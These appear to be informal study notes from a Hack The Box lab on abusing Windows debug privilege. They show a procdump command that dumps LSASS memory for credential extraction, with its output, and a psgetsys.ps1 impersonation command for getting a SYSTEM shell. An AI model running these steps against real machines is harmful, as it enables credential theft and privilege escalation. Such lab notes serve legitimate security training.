
Debug privilege is imporatnt it gives us the privilege to debug most processes in the system, we can use to fuck over the LSASS process and dump its memory. this allows us to dump credentials from the memory dump



so we can create the dump file and then we can dump it using LSASS or we can dump it using procdump.exe

```powershell
// --------------------- Dumping lsass with procdump --------------------- //
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.



// ---------------------    Enuerating to get RCE using psgetsys.ps1  --------------------- //

tasklist /svc ----> find something thats being run by system

// ---------------------    Getting RCE using psgetsys.ps1  --------------------- //
ImpersonateFromParentPid -ppid 600 -command cmd.exe
```





